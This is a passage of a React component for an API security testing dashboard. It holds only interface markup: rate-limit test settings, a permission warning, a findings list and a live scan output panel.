              <div className="grid grid-cols-3 gap-4">
                <div className="space-y-2">
                  <Label>Concurrent Requests</Label>
                  <Input
                    type="number"
                    value={rateTestConcurrency}
                    onChange={(e) => setRateTestConcurrency(parseInt(e.target.value) || 10)}
                    min={1}
                    max={100}
                  />
                </div>
                <div className="space-y-2">
                  <Label>Duration (seconds)</Label>
                  <Input
                    type="number"
                    value={rateTestDuration}
                    onChange={(e) => setRateTestDuration(parseInt(e.target.value) || 30)}
                    min={5}
                    max={300}
                  />
                </div>
                <div className="space-y-2">
                  <Label>Delay between batches (ms)</Label>
                  <Input
                    type="number"
                    value={rateTestDelay}
                    onChange={(e) => setRateTestDelay(parseInt(e.target.value) || 0)}
                    min={0}
                    max={5000}
                  />
                </div>
              </div>

              <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-md">
                <p className="text-sm text-yellow-600 dark:text-yellow-400">
                  ⚠️ Warning: Rate limit testing sends many requests to the target. Only use on systems you have permission to test.
                </p>
              </div>

              <Button
                onClick={runRateLimitTest}
                disabled={isScanning}
                className="w-full"
              >
                {isScanning ? (
                  <>
                    <Square className="h-4 w-4 mr-2" onClick={stopScan} />
                    Testing...
                  </>
                ) : (
                  <>
                    <Clock className="h-4 w-4 mr-2" />
                    Start Rate Limit Test
                  </>
                )}
              </Button>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>

      {/* Results Section */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Findings */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <AlertTriangle className="h-5 w-5" />
              Security Findings ({findings.length})
            </CardTitle>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-80">
              {findings.length === 0 ? (
                <p className="text-muted-foreground text-center py-8">
                  No findings yet. Run a scan to discover vulnerabilities.
                </p>
              ) : (
                <div className="space-y-3">
                  {findings.map((finding) => (
                    <div key={finding.id} className="p-3 bg-muted/50 rounded-lg space-y-2">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <Badge className={getSeverityColor(finding.severity)}>
                            {finding.severity.toUpperCase()}
                          </Badge>
                          <span className="font-medium text-sm">{finding.title}</span>
                        </div>
                        <span className="text-xs text-muted-foreground">
                          {finding.timestamp.toLocaleTimeString()}
                        </span>
                      </div>
                      <p className="text-sm text-muted-foreground">{finding.description}</p>
                      <p className="text-xs font-mono bg-background p-2 rounded">
                        {finding.endpoint}
                      </p>
                      {finding.proof && (
                        <p className="text-xs text-muted-foreground">
                          <strong>Proof:</strong> {finding.proof}
                        </p>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </ScrollArea>
          </CardContent>
        </Card>

        {/* Scan Output */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Activity className="h-5 w-5" />
              Live Output
            </CardTitle>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-80 rounded-md border bg-background/50 p-4">
              <div className="font-mono text-xs space-y-1">
                {scanOutput.length === 0 ? (
                  <p className="text-muted-foreground">Waiting for scan output...</p>
                ) : (
                  scanOutput.map((line, i) => (
                    <div key={i} className="text-muted-foreground">
                      {line}
                    </div>
                  ))
                )}
              </div>
            </ScrollArea>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default APISecurityTesting;
